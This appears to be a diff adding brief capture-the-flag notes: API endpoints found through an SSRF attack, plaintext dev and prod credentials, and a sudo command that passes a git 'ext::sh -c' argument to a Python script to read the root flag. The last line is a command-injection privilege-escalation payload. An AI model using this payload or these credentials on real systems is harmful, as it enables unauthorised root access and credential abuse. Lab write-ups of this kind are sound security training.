@@ -1,0 +1,17 @@
+### API Endpoints recovered from the SSRF attack on the web server
+```
+
+/api/latest/metadata/messages/promos
+/api/latest/metadata/messages/coupons
+/api/latest/metadata/messages/authors
+/api/latest/metadata/messages/how_to_use_platform
+/api/latest/metadata/changelog
+/api/latest/metadata
+```
+
+### User Credentials
+dev:dev080217_devAPI!@
+prod:080217_Producti0n_2023!@
+
+### Command to get the root flag
+sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root.txt'
